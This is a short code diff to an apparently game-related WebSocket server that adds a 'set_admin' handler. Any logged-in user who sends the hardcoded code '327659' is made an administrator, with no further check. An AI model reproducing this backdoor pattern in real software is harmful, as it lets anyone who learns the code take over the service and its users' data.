@@ -206,6 +206,19 @@ wss.on('connection', (ws) => {
         break;
       }
 
+      case 'set_admin': {
+        if (!currentUser) return;
+        if (msg.code === '327659') {
+          const users = loadUsers();
+          if (users[currentUser]) {
+            users[currentUser].admin = true;
+            saveUsers(users);
+          }
+          ws.send(JSON.stringify({ type: 'admin_success', message: 'Admin access granted' }));
+        }
+        break;
+      }
+
       case 'find_player': {
         const { target } = msg;
         if (!target || target === currentUser) {
